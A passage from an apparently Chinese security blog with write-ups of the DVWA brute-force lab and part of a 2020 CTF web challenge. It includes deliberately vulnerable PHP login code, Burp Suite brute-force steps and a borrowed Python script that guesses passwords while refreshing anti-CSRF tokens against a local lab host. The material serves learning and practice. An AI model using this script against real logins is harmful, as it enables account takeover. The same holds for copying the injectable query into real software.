alt="安装配置成功"></p>
-<h1 id="做题（一）漏洞-蛮力"><a href="#做题（一）漏洞-蛮力" class="headerlink" title="做题（一）漏洞 蛮力"></a>做题（一）漏洞 蛮力</h1><p>打开页面只有一个登录框<br><img src="https://img-blog.csdnimg.cn/20201018144104788.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<h2 id="low"><a href="#low" class="headerlink" title="low"></a>low</h2><p>然后就直接用原始的账号密码进行登录<img src="https://img-blog.csdnimg.cn/20201018144153228.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>然后就出现了这个，目测估计是成功了，然后就开始找做题方法。<br>当时就直接想到了brupsuit抓包处理。<br>但是抓包爆破了好久没结果，整的毫无头绪的时候，就去查看了一下这道题low难度的源码，发现：<br><img src="https://img-blog.csdnimg.cn/20201018155256356.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Login'</span> ] ) ) &#123;</span><br><span class="line">	<span class="comment">// Get username</span></span><br><span class="line">	$user = $_GET[ <span class="string">'username'</span> ];</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Get password</span></span><br><span class="line">	$pass = $_GET[ <span class="string">'password'</span> ];</span><br><span class="line">	$pass = md5( $pass );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Check the database</span></span><br><span class="line">	$query  = <span class="string">"SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';"</span>;</span><br><span class="line">	$result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>( $result &amp;&amp; mysqli_num_rows( $result ) == <span class="number">1</span> ) &#123;</span><br><span class="line">		<span class="comment">// Get users details</span></span><br><span class="line">		$row    = mysqli_fetch_assoc( $result );</span><br><span class="line">		$avatar = $row[<span class="string">"avatar"</span>];</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Login successful</span></span><br><span class="line">		$html .= <span class="string">"&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;"</span>;</span><br><span class="line">		$html .= <span class="string">"&lt;img src=\"&#123;$avatar&#125;\" /&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// Login failed</span></span><br><span class="line">		$html .= <span class="string">"&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]))) ? <span class="keyword">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>然后是get方式，我再去看brupsuit抓的是post方式，才知道，做错难度了。改正之后low难度的就直接抓包爆破成功得到<code>admin、password</code>。<img src="https://img-blog.csdnimg.cn/2020101816270580.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<h2 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h2><p>这个难度加一的上来就直接先来一手查看源码，反手一个超级加倍</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Login'</span> ] ) ) &#123;</span><br><span class="line">	<span class="comment">// Sanitise username input</span></span><br><span class="line">	$user = $_GET[ <span class="string">'username'</span> ];</span><br><span class="line">	$user = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $user ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Sanitise password input</span></span><br><span class="line">	$pass = $_GET[ <span class="string">'password'</span> ];</span><br><span class="line">	$pass = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $pass ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">	$pass = md5( $pass );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Check the database</span></span><br><span class="line">	$query  = <span class="string">"SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';"</span>;</span><br><span class="line">	$result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>( $result &amp;&amp; mysqli_num_rows( $result ) == <span class="number">1</span> ) &#123;</span><br><span class="line">		<span class="comment">// Get users details</span></span><br><span class="line">		$row    = mysqli_fetch_assoc( $result );</span><br><span class="line">		$avatar = $row[<span class="string">"avatar"</span>];</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Login successful</span></span><br><span class="line">		$html .= <span class="string">"&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;"</span>;</span><br><span class="line">		$html .= <span class="string">"&lt;img src=\"&#123;$avatar&#125;\" /&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// Login failed</span></span><br><span class="line">		sleep( <span class="number">2</span> );</span><br><span class="line">		$html .= <span class="string">"&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]))) ? <span class="keyword">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>审计了源码之后发现，这个难度就是在上面那个low基础上增加了一个登录错误的情况下的时间停顿，增加了爆破的成本，但是还是可以直接爆破出来的。<br><img src="https://img-blog.csdnimg.cn/20201018163030975.png#pic_center" alt="在这里插入图片描述"></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sleep(<span class="number">2</span>)<span class="comment">//登录信息错误停顿两秒</span></span><br></pre></td></tr></table></figure>
-<p>所以直接就是还是刚刚的方法，字典都一样，就爆破出来了。<br><img src="https://img-blog.csdnimg.cn/20201018163347805.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>一样的结果。</p>
-<h2 id="high"><a href="#high" class="headerlink" title="high"></a>high</h2><p>上面的两个过于简单，给了我一点莫名的自信，于是在自信的驱使下来到了第三个high难度的。<br>老规矩，来波源码查看（毕竟要稳中求胜）。然后发现比起前两个多了一段源码。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br></pre></td></tr></table></figure>
-<p>然后就是<code>checkToken 函数的意思就是说实现表单的重复提交，就是说用户的账号密码随机码按照一定的加密方式生成一个字符串用作token，然后每次用户登陆操作时就会和已保存的token进行对比，错误则返回false</code>。<br>然后经过抓包实验发现，每次的<code>user_token</code>会在下一次的响应包里发送给浏览器。<br><img src="https://img-blog.csdnimg.cn/20201018165311220.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="第一次抓包"><br><img src="https://img-blog.csdnimg.cn/2020101816533645.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="第二次抓包"><br>源码如下：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Login'</span> ] ) ) &#123;</span><br><span class="line">	<span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">	checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Sanitise username input</span></span><br><span class="line">	$user = $_GET[ <span class="string">'username'</span> ];</span><br><span class="line">	$user = stripslashes( $user );</span><br><span class="line">	$user = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $user ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Sanitise password input</span></span><br><span class="line">	$pass = $_GET[ <span class="string">'password'</span> ];</span><br><span class="line">	$pass = stripslashes( $pass );</span><br><span class="line">	$pass = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $pass ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">	$pass = md5( $pass );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Check database</span></span><br><span class="line">	$query  = <span class="string">"SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';"</span>;</span><br><span class="line">	$result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>( $result &amp;&amp; mysqli_num_rows( $result ) == <span class="number">1</span> ) &#123;</span><br><span class="line">		<span class="comment">// Get users details</span></span><br><span class="line">		$row    = mysqli_fetch_assoc( $result );</span><br><span class="line">		$avatar = $row[<span class="string">"avatar"</span>];</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Login successful</span></span><br><span class="line">		$html .= <span class="string">"&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;"</span>;</span><br><span class="line">		$html .= <span class="string">"&lt;img src=\"&#123;$avatar&#125;\" /&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// Login failed</span></span><br><span class="line">		sleep( rand( <span class="number">0</span>, <span class="number">3</span> ) );</span><br><span class="line">		$html .= <span class="string">"&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]))) ? <span class="keyword">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>发现源码中加入了两个函数：<code>stripslashes();
-mysql_real_escape_string();</code></p>
-<blockquote>
-<p>stripslashes（去除字符串中的反斜线字符,如果有两个连续的反斜线,则只去掉一个）、 mysql_real_escape_string对参数username、password进行过滤、转义，进一步抵御sql注入</p>
-</blockquote>
-<p>顺便发现大佬说的无法<strong>csrf</strong>攻击，这我也不知道，所以就百度了一下<a href="https://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html" target="_blank" rel="noopener">什么是CSRF攻击</a></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">看了之后给我的理解说就是，用户在访问一个受信任的网站时生成了一个本地的cookie，然后在cookie未过期之前访问了另外一个危险网站，然后危险网站会发出一个request请求，同时安全的网站不知道这个操作是用户发出的还是攻击者发出的，就会进行处理，从而达到了模仿用户进行操作的目标。</span><br></pre></td></tr></table></figure>
-<p>然后上面抓包发现整个输入信息验证以及响应的过程总共就只有四个get型参数。<code>username、password、login以及user_token</code>。<br>然后这个题我就放弃了brupsuit抓包，因为我懒，听说脚本挺方便的。<br>但是，这，，，，这涉及到我的知识盲区了啊这个，得加紧练习脚本能力了。<br>所以这里就贴了一个大佬的脚本，自己单纯的去运行了一下。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line">header=&#123; <span class="string">'Host'</span>: <span class="string">'192.168.xxx.xxx'</span>, //目标主机（DVWA）的ip</span><br><span class="line"><span class="string">'Cache-Control'</span>: <span class="string">'max-age=0'</span>,</span><br><span class="line"><span class="string">'If-None-Match'</span>: <span class="string">"307-52156c6a290c0"</span>,</span><br><span class="line"><span class="string">'If-Modified-Since'</span>: <span class="string">'Mon, 05 Oct 2015 07:51:07 GMT'</span>,</span><br><span class="line"><span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36'</span>,</span><br><span class="line"><span class="string">'Accept'</span>: <span class="string">'*/*'</span>,</span><br><span class="line"><span class="string">'Referer'</span>: <span class="string">'http://192.168.xxx.xxx/dvwa/vulnerabilities/brute/index.php'</span>,</span><br><span class="line"><span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate, sdch'</span>,</span><br><span class="line"><span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.8'</span>,</span><br><span class="line"><span class="string">'Cookie'</span>: <span class="string">'security=high; PHPSESSID=5re92j36t4f2k1gvnqdf958bi2'</span>&#125;</span><br><span class="line">requrl = <span class="string">"http://192.168.xxx.xxx/dvwa/vulnerabilities/brute/"</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_token</span><span class="params">(requrl,header)</span>:</span></span><br><span class="line">req = urllib2.Request(url=requrl,headers=header)</span><br><span class="line">response = urllib2.urlopen(req)</span><br><span class="line"><span class="keyword">print</span> response.getcode(),</span><br><span class="line">the_page = response.read()</span><br><span class="line"><span class="keyword">print</span> len(the_page)</span><br><span class="line">soup = BeautifulSoup(the_page,<span class="string">"html.parser"</span>)</span><br><span class="line">user_token = soup.form.input.input.input.input[<span class="string">"value"</span>] <span class="comment">#get the user_token</span></span><br><span class="line"><span class="keyword">return</span> user_token</span><br><span class="line"> </span><br><span class="line">user_token = get_token(requrl,header)</span><br><span class="line">i=<span class="number">0</span><span class="keyword">for</span> line <span class="keyword">in</span> open(<span class="string">"rkolin.txt"</span>):</span><br><span class="line">requrl = <span class="string">"http://192.168.xxx.xxx/dvwa/vulnerabilities/brute/"</span>+<span class="string">"?username=admin&amp;password="</span>+line.strip()+<span class="string">"&amp;Login=Login&amp;user_token="</span>+user_token</span><br><span class="line">i = i+<span class="number">1</span></span><br><span class="line"><span class="keyword">print</span> i,<span class="string">'admin'</span>,line.strip(),</span><br><span class="line">user_token = get_token(requrl,header)</span><br><span class="line"><span class="keyword">if</span> (i == <span class="number">10</span>):</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure>
-<p>进行一些简单的修改之后就可以运行了。<br>然后我发现超菜的我连白拿脚本都不配，好吧好吧，还是转brupsuit爆破吧。<br>打开抓包，发送到爆破那里，设置三个参数，<code>username、password和user_token</code>，模式采用第三个。<br>然后打开<code>options</code>，线程设为1，<img src="https://img-blog.csdnimg.cn/2020101817531128.png#pic_center" alt="在这里插入图片描述"><br>在图示模块里点击add，<img src="https://img-blog.csdnimg.cn/20201018175417951.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2020101817590788.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>最下面设置为always。<br>打开之后点击<code>Refetch response</code> ，找到<code>value</code>，记住选中<code>value</code>，图中部分。然后在设置字典界面添加字典。<br><img src="https://img-blog.csdnimg.cn/20201018175730659.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>然后token变量部分设置为图中所示，将刚刚复制的一串字符串value值粘过来。开始爆破。<br><img src="https://img-blog.csdnimg.cn/20201018180026870.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>得到结果，验证正确。<br>等以后脚本能力提升了，我再回来补回来脚本这一部分的解法。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://momaxx.github.io/2020/11/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020%E5%B9%B4%E9%83%A8%E5%88%86wp/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="moMaxX">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Momax's blog">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/11/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020%E5%B9%B4%E9%83%A8%E5%88%86wp/" class="post-title-link" itemprop="url">极客大挑战2020年部分wp</a>
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2020-11-18 23:08:05 / Modified: 23:07:55" itemprop="dateCreated datePublished" datetime="2020-11-18T23:08:05+08:00">2020-11-18</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>@<a href="2020极客大挑战部分wp">TOC</a></p>
-<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>2020极客大挑战开始了。又是一届自闭季。在变菜的路上一去不复返</p>
-<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="一、朋友的学妹"><a href="#一、朋友的学妹" class="headerlink" title="一、朋友的学妹"></a>一、朋友的学妹</h2><p>打开题目<img src="https://img-blog.csdnimg.cn/20201030235122118.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="题目"><br>发现提示，然后查看控制窗口发现<br><img src="https://img-blog.csdnimg.cn/20201030235235491.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="发现"><br>然后看到base64加密，解密后得到flag。</p>
-<h2 id="二、EZWWW"><a href="#二、EZWWW" class="headerlink" title="二、EZWWW"></a>二、EZWWW</h2><p>打开题目<img src="https://img-blog.csdnimg.cn/20201030235410875.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="题目"><br>发现提示网站已经备份，那么就直接御剑扫后台得到<br><img src="https://img-blog.csdnimg.cn/20201030235509585.png#pic_center" alt="御剑扫描结果"><br>然后打开zip路径得到下载提示，打开<img src="https://img-blog.csdnimg.cn/2020103023560063.png#pic_center" alt="打开压缩包"><br>直接放弃文档里的flag。肯定假的。所以打开index.php，发现</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"> &lt;head&gt;</span><br><span class="line">  &lt;title&gt;Lola<span class="string">'s website1.0&lt;/title&gt;</span></span><br><span class="line"><span class="string"> &lt;/head&gt;</span></span><br><span class="line"><span class="string"> &lt;body&gt;</span></span><br><span class="line"><span class="string"> &lt;?php echo '</span>&lt;h1&gt;welcome to my website&lt;/h1&gt;<span class="string">'; ?&gt;</span></span><br><span class="line"><span class="string"> &lt;?php echo '</span>&lt;p&gt;i will never forget to backup my website......&lt;/p&gt;<span class="string">'; ?&gt;</span></span><br><span class="line"><span class="string"> &lt;?php echo '</span>&lt;img src=<span class="string">"img/lola.gif"</span> alt=<span class="string">"welcome~"</span>/&gt;<span class="string">'; ?&gt;</span></span><br><span class="line"><span class="string"> &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">$key1 = $_POST['</span>a<span class="string">'];</span></span><br><span class="line"><span class="string">$key2 = base64_decode('</span>c3ljbDB2ZXI=<span class="string">');</span></span><br><span class="line"><span class="string">if($key1 === $key2)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    //this is a true flag</span></span><br><span class="line"><span class="string">echo '</span>&lt;p&gt;SYC&#123;xxxxxxxxxxxxxxxxxx&#125;&lt;/p&gt;<span class="string">';</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>发现题目源码，然后按照源码意思，进行所给字符串的base64解码，然后<code>post a=解码后的字符</code>。就会得到flag。<img src="https://img-blog.csdnimg.cn/20201030235811365.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="flag得到"></p>
